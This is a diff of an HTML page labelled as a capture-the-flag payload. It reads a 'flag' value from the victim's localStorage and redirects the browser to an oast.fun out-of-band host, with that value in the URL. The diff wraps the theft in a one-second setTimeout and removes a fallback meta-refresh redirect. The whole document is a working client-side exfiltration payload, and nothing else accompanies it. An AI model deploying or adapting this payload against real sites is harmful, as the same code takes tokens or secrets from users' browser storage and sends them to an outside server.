@@ -4,17 +4,12 @@
   <meta charset="UTF-8" />
   <title>CTF Payload - Meta Refresh</title>
   <script>
-    (function() {
+    setTimeout(() => {
       const flag = localStorage.getItem('flag') || '';
-      // Redirect by changing window.location
       window.location = 'https://bhvsumorecywkcaevmkui8q6n12uvuhmu.oast.fun/?flag=' + encodeURIComponent(flag);
-    })();
+    }, 1000); // wait 1 second before redirect
   </script>
-  <!--
-    You can add a fallback meta refresh in case JS is disabled,
-    but it can't dynamically include the flag without JS.
-  -->
-  <meta http-equiv="refresh" content="5;url=https://bhvsumorecywkcaevmkui8q6n12uvuhmu.oast.fun/">
+
 </head>
 <body>
   <h1>Redirecting...</h1>
